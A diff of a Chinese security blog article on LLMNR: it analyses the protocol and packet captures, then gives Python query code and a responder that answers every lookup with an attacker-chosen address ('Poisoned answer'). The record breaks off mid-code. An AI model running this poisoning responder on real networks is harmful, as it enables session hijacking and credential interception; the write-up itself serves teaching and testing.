@@ -18,20 +18,38 @@
   <meta name="author" content="eW1z4rd">
   <meta name="keywords" content="">
   
-    <meta name="description" content="本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。 0x00 LLMNR 简介从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是">
+    <meta name="description" content="本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="利用 LLMNR 名称解析缺陷劫持内网指定主机会话">
 <meta property="og:url" content="https://ew1z4rd.github.io/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/index.html">
 <meta property="og:site_name" content="栖丘">
-<meta property="og:description" content="本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。 0x00 LLMNR 简介从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是">
+<meta property="og:description" content="本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160617-02a1becc-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160636-0e06ea6c-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160649-1631b05a-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160724-2aa8db3a-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160747-38c1da50-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160820-4c222a64-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160835-54f37a3a-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160859-638cf5c6-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160934-78309122-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160943-7d99c9ee-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160954-83e858ec-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161019-9324c796-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161027-97d2bfd2-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161042-a10626c0-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161056-a967b112-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161109-b12561c4-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161120-b761d7e8-d413-1.png">
+<meta property="og:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128161127-bbbb955e-d413-1.png">
 <meta property="article:published_time" content="2019-08-02T14:30:35.000Z">
-<meta property="article:modified_time" content="2022-01-30T03:11:19.491Z">
+<meta property="article:modified_time" content="2022-02-02T14:05:45.084Z">
 <meta property="article:author" content="eW1z4rd">
-<meta property="article:tag" content="exploit">
-<meta property="article:tag" content="concept">
-<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="LLMNR">
+<meta property="article:tag" content="名称解析">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://ew1z4rd.github.io/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160617-02a1becc-d413-1.png">
   
   
   <title>利用 LLMNR 名称解析缺陷劫持内网指定主机会话 - 栖丘</title>
@@ -201,7 +219,7 @@
   
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      11k 字
+      9.6k 字
     </span>
   
 
@@ -210,11 +228,19 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      95 分钟
+      27 分钟
     </span>
   
 
   
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
   
 </div>
 
@@ -243,15 +269,12 @@
             
             <div class="markdown-body">
               <p>本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。</p>
-<h3 id="0x00-LLMNR-简介"><a href="#0x00-LLMNR-简介" class="headerlink" title="0x00 LLMNR 简介"></a>0x00 LLMNR 简介</h3><p>从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于  DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p>
-<span id="more"></span>
-
+<h2 id="0x00-LLMNR-简介"><a href="#0x00-LLMNR-简介" class="headerlink" title="0x00 LLMNR 简介"></a>0x00 LLMNR 简介</h2><p>从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于  DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p>
 <h3 id="0x01-LLMNR-协议分析"><a href="#0x01-LLMNR-协议分析" class="headerlink" title="0x01 LLMNR 协议分析"></a>0x01 LLMNR 协议分析</h3><p>LLMNR 协议定义在 <a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc4795">RFC 4795</a> 中。文档里详细的介绍了有关于 LLMNR 协议的结构，配置以及安全性等内容。</p>
 <ul>
 <li>LLMNR 的协议结构如下图所示：</li>
 </ul>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160617-02a1becc-d413-1.png)</p>
-<p>图1：LLMNR 协议结构</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160617-02a1becc-d413-1.png" srcset="/img/loading.gif" lazyload alt="LLMNR 协议结构"></p>
 <ul>
 <li>LLMNR 协议结构图中各个字段的说明如下：<ul>
 <li>ID - Transaction ID 是一个随机生成的用来标识质询与应答的 16 位标识符。</li>
@@ -269,21 +292,17 @@
 </ul>
 </li>
 </ul>
-<h3 id="0x02-LLMNR-名称解析过程"><a href="#0x02-LLMNR-名称解析过程" class="headerlink" title="0x02 LLMNR 名称解析过程"></a>0x02 LLMNR 名称解析过程</h3><p>一个完整的正常的 LLMNR 名称解析过程如下图所示（ 假定主机 B 已加入了组播组中）：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160636-0e06ea6c-d413-1.png)</p>
-<p>图2：一个完整的正常的 LLMNR 名称解析过程</p>
+<h2 id="0x02-LLMNR-名称解析过程"><a href="#0x02-LLMNR-名称解析过程" class="headerlink" title="0x02 LLMNR 名称解析过程"></a>0x02 LLMNR 名称解析过程</h2><p>一个完整的正常的 LLMNR 名称解析过程如下图所示（ 假定主机 B 已加入了组播组中）：</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160636-0e06ea6c-d413-1.png" srcset="/img/loading.gif" lazyload alt="一个完整的正常的 LLMNR 名称解析过程"></p>
 <p>使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160649-1631b05a-d413-1.png)</p>
-<p>图3：一个完整的 LLMNR 质询/应答过程数据包</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160649-1631b05a-d413-1.png" srcset="/img/loading.gif" lazyload alt="一个完整的 LLMNR 质询/应答过程数据包"></p>
 <p>从上图可以看到，编号为 No.3 和 No.4 的数据包证明了主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和  IPv6 的广播地址进行了广播，质询数据包的 TID 为 0xc7f7。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或  AAAA 进行区别，一个 A 表示请求的地址类型为 IPv4 地址，四个 A（AAAA）表示请求的地址类型为 IPv6 地址。</p>
 <p>编号为 No.5 的数据包证明了主机 B（192.168.16.130）收到请求数据包后，发现有主机请求自己的 IP地址，于是向主机 A  进行单播应答，将自己的 IP 地址单播给了主机 A，应答的地址类型为 IPv4，同时该数据包的 TID 的值为上面主机 A 进行广播的数据包的  TID（0xc7f7）。</p>
 <p>质询的数据包的详细结构如下图所示：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160724-2aa8db3a-d413-1.png)</p>
-<p>图 4：质询的数据包详细结构</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160724-2aa8db3a-d413-1.png" srcset="/img/loading.gif" lazyload alt="质询的数据包详细结构"></p>
 <p>应答的数据包的详细结构如下图所示：</p>
-<p>![img](/img/利用 LLMNR 名称解析缺陷劫持内网指定主机会话/20171128160747-38c1da50-d413-1.png)</p>
-<p>图5：应答的数据包详细结构</p>
-<h3 id="0x03-编程实现-LLMNR-的质询和应答"><a href="#0x03-编程实现-LLMNR-的质询和应答" class="headerlink" title="0x03 编程实现 LLMNR 的质询和应答"></a>0x03 编程实现 LLMNR 的质询和应答</h3><p>通过上面的内容，可以很直观的理解 LLMNR 进行名称解析的详细过程，使用 Python 可以快速实现 LLMNR 协议的质询和应答编程。<br>LLMNR 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p>
+<p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160747-38c1da50-d413-1.png" srcset="/img/loading.gif" lazyload alt="应答的数据包详细结构"></p>
+<h2 id="0x03-编程实现-LLMNR-的质询和应答"><a href="#0x03-编程实现-LLMNR-的质询和应答" class="headerlink" title="0x03 编程实现 LLMNR 的质询和应答"></a>0x03 编程实现 LLMNR 的质询和应答</h2><p>通过上面的内容，可以很直观的理解 LLMNR 进行名称解析的详细过程，使用 Python 可以快速实现 LLMNR 协议的质询和应答编程。<br>LLMNR 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br><br>        self.IsIPv4 = <span class="hljs-literal">True</span><br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;224.0.0.252&#x27;</span> <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;FF02::1:3&#x27;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.s_family = socket.AF_INET <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> socket.AF_INET6<br><br>        self.QueryType = <span class="hljs-string">&quot;IPv4&quot;</span><br>        self.lqs = socket.socket(self.s_family, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;LENGTH&quot;</span>    <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;TYPE&quot;</span>      <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br>        namelen = <span class="hljs-built_in">len</span>(self.name)<br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>        self.data = self.data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;&gt;&quot;</span>+<span class="hljs-built_in">str</span>(namelen)+<span class="hljs-string">&quot;s&quot;</span>, self.name))<br>        self.data = self.data.replace(<span class="hljs-string">&quot;TYPE&quot;</span>,  <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-keyword">if</span> self.QueryType == <span class="hljs-string">&quot;IPv4&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;\x00\x1c&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LLMNR Querying... -&gt; %s&quot;</span> % self.name<br>            self.lqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.lqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Query(<span class="hljs-string">&quot;Wooyun&quot;</span>)<br>    llmnr.Query()<br></code></pre></td></tr></table></figure>
 
 <p>要对 LLMNR 协议的质询请求进行应答，首先要将本机加入多播（或组播）组中，所使用的协议为 IGMP。具体编程实现的方式可以直接构造数据包使用 UDP 发送，也可以使用套接字提供的 setsockopt 函数进行设置。</p>
@@ -292,18 +311,15 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>            <span class="hljs-string">&quot;TID&quot;</span>               <span class="hljs-comment"># Tid</span><br>            <span class="hljs-string">&quot;\x80\x00&quot;</span>          <span class="hljs-comment"># Flags  Query(0x0000)? or Response(0x8000) ?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Question</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Authority RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Additional RRS</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Question Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Question Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Question Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Answer Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Answer Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Answer Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;\x00\x00\x00\x1e&quot;</span>  <span class="hljs-comment"># TTL Default:30s</span><br>            <span class="hljs-string">&quot;\x00\x04&quot;</span>          <span class="hljs-comment"># IP Length</span><br>            <span class="hljs-string">&quot;IPADDR&quot;</span>)           <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.MulADDR  = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br>        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.las.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data, addr = self.las.recvfrom(<span class="hljs-number">1024</span>)<br><br>            tid = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>            namelen = struct.unpack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, data[<span class="hljs-number">12</span>])[<span class="hljs-number">0</span>]<br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">13</span> + namelen]<br><br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br><br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % (self.IPADDR, addr[<span class="hljs-number">0</span>], name)<br>            self.las.sendto(data, addr)<br><br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br>        self.las.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span 